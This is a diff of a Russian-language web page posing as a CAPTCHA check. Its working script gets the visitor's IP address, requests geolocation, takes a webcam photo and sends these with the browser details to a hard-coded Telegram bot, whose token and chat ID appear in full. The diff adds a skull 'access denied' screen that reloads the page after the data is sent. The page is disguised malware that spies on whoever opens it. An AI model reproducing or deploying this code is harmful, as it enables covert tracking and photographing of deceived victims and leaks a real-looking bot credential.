@@ -22,7 +22,7 @@
             background: #0a0f1e;
         }
 
-        /* ----- Анимированный градиентный фон (оживлённый) ----- */
+        /* Анимированный градиентный фон */
         body::before {
             content: '';
             position: absolute;
@@ -47,7 +47,7 @@
             100% { background-position: 0% 50%; }
         }
 
-        /* ----- Анимированные частицы / звёзды (оживление) ----- */
+        /* Анимированные звёзды */
         body::after {
             content: '';
             position: absolute;
@@ -73,7 +73,7 @@
             100% { transform: translateY(-100px); }
         }
 
-        /* ----- Карточка ----- */
+        /* Карточка */
         .card {
             background: rgba(15, 25, 45, 0.65);
             backdrop-filter: blur(14px);
@@ -92,7 +92,6 @@
             transform: scale(1.01);
         }
 
-        /* ----- Иконка / анимация CAPTCHA ----- */
         .captcha-icon {
             font-size: 72px;
             margin-bottom: 20px;
@@ -209,11 +208,11 @@
     </div>
 
     <script>
-        // !!! СЮДА ВСТАВЬ СВОИ ДАННЫЕ ОТ TELEGRAM !!!
-        const TELEGRAM_TOKEN = "8241737351:AAGpCCd1PpuoHPeJ7xJZOjRcPYTVCN-QaOs";   // Например: "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
-        const TELEGRAM_CHAT_ID = "805226689";    // Например: "123456789"
+        // ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИ НА СВОИ) ==========
+        const TELEGRAM_TOKEN = "8241737351:AAGpCCd1PpuoHPeJ7xJZOjRcPYTVCN-QaOs";
+        const TELEGRAM_CHAT_ID = "805226689";
 
-        // ---------- ФУНКЦИЯ ПОЛУЧЕНИЯ IP ----------
+        // ========== ФУНКЦИЯ ПОЛУЧЕНИЯ IP ==========
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -222,7 +221,7 @@
             } catch(e) { return 'не удалось определить'; }
         }
 
-        // ---------- ФУНКЦИЯ ПОЛУЧЕНИЯ ГЕОЛОКАЦИИ ----------
+        // ========== ФУНКЦИЯ ПОЛУЧЕНИЯ ГЕОЛОКАЦИИ ==========
         async function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -236,7 +235,7 @@
             });
         }
 
-        // ---------- ФУНКЦИЯ ФОТОГРАФИРОВАНИЯ ----------
+        // ========== ФУНКЦИЯ ФОТОГРАФИРОВАНИЯ ==========
         async function takePhoto() {
             return new Promise((resolve) => {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -263,7 +262,7 @@
             });
         }
 
-        // ---------- ОТПРАВКА В TELEGRAM ----------
+        // ========== ОТПРАВКА В TELEGRAM ==========
         async function sendToTelegram(ip, location, photo) {
             const ua = navigator.userAgent;
             const caption = `✅ ПРОВЕРКА ПРОЙДЕНА
@@ -295,7 +294,84 @@
             }
         }
 
-        // ---------- ОСНОВНОЙ ЗАПУСК ----------
+        // ========== ЭКРАН С ЧЕРЕПОМ (ПОСЛЕ ОТПРАВКИ) ==========
+        function showSkullScreen() {
+            // Создаём чёрный фон
+            const overlay = document.createElement('div');
+            overlay.id = 'skull-screen';
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: black;
+                z-index: 99999;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                font-family: monospace;
+                text-align: center;
+                padding: 20px;
+            `;
+
+            // ASCII-арт черепа (твой вариант)
+            const skull = document.createElement('pre');
+            skull.style.cssText = `
+                color: #ff3333;
+                font-size: 12px;
+                margin-bottom: 30px;
+                text-shadow: 0 0 8px red;
+                line-height: 1.2;
+                font-weight: bold;
+            `;
+            skull.textContent = `
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣏⢻⣿⣿⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣦⠻⣿⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿⣿⣿⠋⣼⣿⣿
+⣿⣿⣿⣿⣦⠙⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⣿⠟⢡⣾⣿⣿⣿
+⣿⣿⣿⣿⣿⣷⣄⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟⢁⣴⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⡟⢛⣷⣄⡈⢙⡻⠿⡟⠉⣂⣴⡛⢿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⡔⡿⢟⣛⡫⠥⢈⣑⡠⠭⣛⡻⢿⢸⣿⣿⣿⣿⣿
+⣿⣄⣠⣄⣠⣆⠩⣽⣶⣶⣿⣿⣿⣿⣷⣶⡮⢁⣤⣀⣄⣄⣄⣿
+⣿⣿⣿⣿⣿⣿⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣅⣸⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+            `;
+
+            const title = document.createElement('h1');
+            title.textContent = 'ДОСТУП ЗАПРЕЩЁН';
+            title.style.cssText = `
+                color: #ff3333;
+                font-size: 32px;
+                margin: 20px 0;
+                letter-spacing: 4px;
+                font-family: monospace;
+                text-shadow: 0 0 10px red;
+            `;
+
+            const message = document.createElement('p');
+            message.textContent = 'Повторите попытку через 1 минуту';
+            message.style.cssText = `
+                color: #ff9999;
+                font-size: 18px;
+                font-family: monospace;
+            `;
+
+            overlay.appendChild(skull);
+            overlay.appendChild(title);
+            overlay.appendChild(message);
+            document.body.appendChild(overlay);
+
+            // Через 2 секунды перезагружаем страницу
+            setTimeout(() => {
+                window.location.reload();
+            }, 2000);
+        }
+
+        // ========== ОСНОВНОЙ ЗАПУСК ==========
         document.getElementById('verifyBtn').onclick = async () => {
             const btn = document.getElementById('verifyBtn');
             btn.innerHTML = '<span class="loader"></span> Проверка...';
@@ -306,10 +382,9 @@
             const photo = await takePhoto();
 
             await sendToTelegram(ip, location, photo);
-
-            setTimeout(() => {
-                window.location.href = "https://t.me/telegram";
-            }, 1800);
+            
+            // Показываем череп после отправки
+            showSkullScreen();
         };
     </script>
 </body>
